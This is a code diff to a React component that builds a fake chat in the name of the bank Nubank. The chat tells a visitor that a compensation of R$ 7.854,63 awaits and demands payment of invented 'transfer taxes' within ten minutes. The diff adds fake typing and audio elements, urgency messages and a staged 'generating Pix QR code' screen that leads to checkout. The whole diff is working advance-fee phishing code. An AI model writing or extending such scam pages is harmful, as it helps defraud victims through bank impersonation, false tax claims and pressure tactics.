@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { Avatar } from '@/components/ui/avatar';
-import { CheckCircle, Phone } from 'lucide-react';
+import { CheckCircle, Phone, Loader2 } from 'lucide-react';
 import { UserData } from '../BenefitFlow';
 
 interface StepSixProps {
@@ -18,6 +18,9 @@ interface ChatMessage {
   isVideo?: boolean;
   options?: string[];
   showPhone?: boolean;
+  showAudio?: boolean;
+  showFinalButton?: boolean;
+  isTyping?: boolean;
 }
 
 export const StepSix = ({ userData, onNext }: StepSixProps) => {
@@ -25,6 +28,9 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
   const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
   const [userResponses, setUserResponses] = useState<{[key: number]: string}>({});
   const [showFinalStep, setShowFinalStep] = useState(false);
+  const [isTyping, setIsTyping] = useState(false);
+  const [showPaymentFlow, setShowPaymentFlow] = useState(false);
+  const [showPaymentLoading, setShowPaymentLoading] = useState(false);
 
   const chatMessages: ChatMessage[] = [
     {
@@ -89,18 +95,51 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
       content: `Data e Hora da Consulta\n17/07/2025 11:20\n\nProtocolo\n3263091015\n\nVocê possui uma indenização a receber no valor de R$ 7.854,63.`,
       delay: 2000,
       showPhone: true
+    },
+    // New payment flow messages
+    {
+      id: 10,
+      type: 'bot',
+      content: `Seu comprovante foi salvo!\nVocê irá receber uma cópia em até 15 minutos.\n\nATENÇÃO: A Nubank já iniciou o repasse da sua indenização de R$ 7.854,63\n\nPara liberar o seu valor é necessário realizar o pagamento do Imposto de Transferência em até 10 minutos.\n\nClique abaixo para entender o motivo do pagamento desse imposto.`,
+      delay: 3000,
+      options: ['PORQUE TENHO QUE PAGAR ESSE IMPOSTO?']
+    },
+    {
+      id: 11,
+      type: 'bot',
+      content: `IMPORTANTE: Escute o áudio abaixo com bastante atenção!\n\nImpostos gerados:\n\n- IPCT (Imposto sobre Circulação de Transferência 0,21%): R$ 16,49\n\n- IPTI (Imposto sobre Transferência Indenizatório 0,25%): R$ 19,64\n\n- IPRI (Imposto sobre Recebimento Indenizatório 0,25%): R$ 19,64\n\nValor total do Imposto: R$ 55,73\n(0,71% do valor total a receber)`,
+      delay: 3000,
+      showAudio: true
+    },
+    {
+      id: 12,
+      type: 'bot',
+      content: `Somente após você finalizar o pagamento do Imposto de Recebimento a Nubank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.`,
+      delay: 3000,
+      showFinalButton: true
     }
   ];
 
   useEffect(() => {
     if (currentMessageIndex < chatMessages.length) {
       const currentMessage = chatMessages[currentMessageIndex];
-      const timer = setTimeout(() => {
+      
+      // Show typing animation first
+      setIsTyping(true);
+      
+      const typingTimer = setTimeout(() => {
+        setIsTyping(false);
         setVisibleMessages(prev => [...prev, currentMessage.id]);
-        setCurrentMessageIndex(prev => prev + 1);
+        
+        // Only advance to next message if current doesn't require user interaction
+        if (!currentMessage.options && !currentMessage.showPhone && !currentMessage.showFinalButton) {
+          setTimeout(() => {
+            setCurrentMessageIndex(prev => prev + 1);
+          }, 500);
+        }
       }, currentMessage.delay);
 
-      return () => clearTimeout(timer);
+      return () => clearTimeout(typingTimer);
     }
   }, [currentMessageIndex, chatMessages.length]);
 
@@ -109,12 +148,33 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
     
     // Continue with next message after user response
     setTimeout(() => {
-      if (currentMessageIndex < chatMessages.length) {
+      if (messageId === 9) {
+        // After phone confirmation, start payment flow
+        setCurrentMessageIndex(9); // Move to message 10
+      } else if (messageId === 10) {
+        // After "PORQUE TENHO QUE PAGAR" button
+        setCurrentMessageIndex(10); // Move to message 11
+      } else if (currentMessageIndex < chatMessages.length) {
         setCurrentMessageIndex(prev => prev + 1);
       } else {
         setShowFinalStep(true);
       }
     }, 1000);
+  };
+
+  const handlePhoneConfirm = () => {
+    setUserResponses(prev => ({ ...prev, 9: 'SIM, APROVAR INDENIZAÇÃO' }));
+    setTimeout(() => {
+      setCurrentMessageIndex(9); // Move to message 10
+    }, 1000);
+  };
+
+  const handleFinalPayment = () => {
+    setShowPaymentLoading(true);
+    // Simulate loading for 3 seconds then redirect to checkout
+    setTimeout(() => {
+      onNext(); // This will redirect to checkout
+    }, 3000);
   };
 
   const formatMessageContent = (content: string) => {
@@ -203,13 +263,42 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
                         )}
 
                         {/* Phone Number Display */}
-                        {message.showPhone && (
+                        {message.showPhone && !userResponses[message.id] && (
                           <div className="mt-4 space-y-3">
                             <Button 
                               className="w-full bg-primary hover:bg-primary/90 text-white"
-                              onClick={() => setShowFinalStep(true)}
+                              onClick={handlePhoneConfirm}
                             >
                               SIM, APROVAR INDENIZAÇÃO
+                            </Button>
+                          </div>
+                        )}
+
+                        {/* Audio Player */}
+                        {message.showAudio && (
+                          <div className="mt-4">
+                            <div className="bg-gray-100 rounded-lg p-3 flex items-center gap-3">
+                              <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center">
+                                <div className="w-0 h-0 border-l-[6px] border-l-primary border-y-[4px] border-y-transparent ml-0.5"></div>
+                              </div>
+                              <div className="flex-1">
+                                <div className="h-1 bg-gray-300 rounded-full">
+                                  <div className="h-1 bg-primary rounded-full w-1/3"></div>
+                                </div>
+                              </div>
+                              <span className="text-sm text-gray-600">0:32 / -0:02</span>
+                            </div>
+                          </div>
+                        )}
+
+                        {/* Final Payment Button */}
+                        {message.showFinalButton && !userResponses[message.id] && (
+                          <div className="mt-4">
+                            <Button 
+                              className="w-full bg-primary hover:bg-primary/90 text-white h-12 font-semibold"
+                              onClick={handleFinalPayment}
+                            >
+                              Concluir pagamento e receber minha indenização
                             </Button>
                           </div>
                         )}
@@ -254,6 +343,57 @@ export const StepSix = ({ userData, onNext }: StepSixProps) => {
               </div>
             );
           })}
+
+          {/* Typing Indicator */}
+          {isTyping && (
+            <div className="flex gap-3">
+              <Avatar className="w-10 h-10 bg-primary text-white">
+                <span className="text-sm font-bold">nu</span>
+              </Avatar>
+              <div className="flex-1">
+                <Card className="border-0 shadow-sm">
+                  <CardContent className="p-4">
+                    <div className="flex items-center gap-2">
+                      <div className="flex gap-1">
+                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
+                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
+                        <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
+                      </div>
+                      <span className="text-sm text-gray-500">Digitando...</span>
+                    </div>
+                  </CardContent>
+                </Card>
+              </div>
+            </div>
+          )}
+
+          {/* Payment Loading Screen */}
+          {showPaymentLoading && (
+            <div className="fixed inset-0 bg-primary z-50 flex flex-col items-center justify-center text-white">
+              <div className="text-center space-y-8">
+                <div className="text-3xl font-bold">Olá</div>
+                
+                <div className="w-32 h-32 mx-auto relative">
+                  <div className="w-32 h-32 border-4 border-white/30 rounded-full"></div>
+                  <div className="absolute inset-0 w-32 h-32 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
+                  <div className="absolute inset-4 flex items-center justify-center">
+                    <span className="text-2xl font-bold">nu</span>
+                  </div>
+                </div>
+                
+                <div className="space-y-2">
+                  <div className="text-xl font-semibold">Preparando seu pagamento</div>
+                  <div className="text-sm opacity-80">Estamos gerando seu QR Code Pix...</div>
+                </div>
+                
+                <div className="flex gap-2 justify-center">
+                  <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
+                  <div className="w-3 h-3 bg-white rounded-full animate-pulse" style={{animationDelay: '0.2s'}}></div>
+                  <div className="w-3 h-3 bg-white rounded-full animate-pulse" style={{animationDelay: '0.4s'}}></div>
+                </div>
+              </div>
+            </div>
+          )}
 
           {/* Final Step */}
           {showFinalStep && (
